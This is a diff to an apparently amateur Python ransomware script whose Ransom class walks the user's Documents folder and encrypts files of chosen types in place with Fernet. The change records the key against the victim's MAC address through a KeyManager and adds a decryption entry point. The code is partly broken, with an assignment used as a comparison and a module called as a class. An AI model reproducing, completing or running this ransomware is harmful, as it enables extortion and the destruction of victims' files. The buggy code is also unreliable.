@@ -3,6 +3,11 @@ from cryptography.fernet import Fernet
 import os
 import getpass
 import argparse
+import socket
+import uuid
+from uuid import getnode as get_mac
+import KeyManager
+
 
 class Ransom:
 
@@ -18,6 +23,8 @@ class Ransom:
             self.root = '~/Documents/'
         else:
             self.root = root
+        
+        self.keyManager = KeyManager()
 
     def encrypt(self):
         for root, dirs, files in os.walk(self.root):
@@ -27,6 +34,7 @@ class Ransom:
                     self.encryptFile(filePath)
             #for name in dirs:
                # print(os.path.join(root, name))
+        self.keyManager.insertKey(get_mac(), self.key)
 
     def encryptFile(self, file):
         with open(file, 'rb+') as f:
@@ -36,13 +44,20 @@ class Ransom:
             f.write(encryptedContent)
             f.truncate()
 
+    def startDecryption(self):
+        if self.key = '':
+            raise ValueError('The key is empty. Cannot decrypt without a key')
+            print('No key') ### TODO díla við þetta
+            return 
+        
+        self.decrypt()
     def decrypt(self):
         for root, dirs, files in os.walk(self.root):
             for file in files:
                 filePath = os.path.join(root, file)
                 if filePath.split('.')[-1] in self.targets:
                     self.decryptFile(filePath)
-            # DEcrypt directory recursive
+            
         
     def decryptFile(self, file):
         with open(file, 'rb+') as f:
@@ -103,7 +118,6 @@ else: #Encrypt is default
 #if __name__ == '__main__':
     #main()
 
-    
 
         
 
